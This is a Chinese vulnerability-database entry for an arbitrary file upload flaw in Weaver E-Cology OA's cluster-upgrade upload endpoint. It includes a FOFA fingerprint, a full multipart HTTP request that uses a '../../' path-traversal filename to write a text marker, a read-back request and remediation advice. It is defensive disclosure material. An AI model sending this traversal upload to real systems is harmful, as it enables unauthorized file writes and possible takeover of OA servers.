---
cve: ""
fofa: "app=\"泛微-协同办公OA\""
version: "未知"
source: "https://github.com/TD0U/WeaverScan/blob/5360245b20d5a6425c7684d104bf5fa7001d74fc/vulners/Wc9.go"
---

# 泛微E-Cology UploadFileClient 任意文件上传漏洞

## 漏洞描述

泛微 E-Cology 的集群升级上传接口接收客户端提供的文件名。公开验证代码在 `upload` 文件字段的 `filename` 中使用相对路径，将文本文件写到升级目录后回读；这一流程用于验证上传路径约束失效。

## 影响范围与前提

产品：泛微 E-Cology。具体受影响版本与补丁范围未知。上游扫描函数未携带登录 Cookie；部署中的认证及网关限制仍需独立确认。上传目标需处于服务进程可写范围，文本回读并不证明 JSP 可执行。

## 公开验证资料

以下是 `Wc09scancore` 的文本验证流程，标记沿用上游。它会写文件，只适合隔离且允许写入的验证环境。

```http
POST /clusterupgrade/uploadFileClient.jsp HTTP/1.1
Host: oa.example.com
Content-Type: multipart/form-data; boundary=VulWikiBoundary

--VulWikiBoundary
Content-Disposition: form-data; name="upload"; filename="../../clusterupgrade/a7.txt"
Content-Type: image/jpeg

helloword
--VulWikiBoundary--
```

随后回读同一路径：

```http
GET /clusterupgrade/a7.txt HTTP/1.1
Host: oa.example.com
```

确认前应核对该文件事先不存在，回读内容确为本次提交的标记，并清理本次产生的文件。单次上传响应或已有同名文件不能证明漏洞。上游 `Exploit` 函数的上传名与访问名并不一致，本文仅采用路径一致的扫描函数，不保留其命令执行结论。

## 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

## 参考来源

- [公开资料 1](https://github.com/TD0U/WeaverScan/blob/5360245b20d5a6425c7684d104bf5fa7001d74fc/vulners/Wc9.go)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
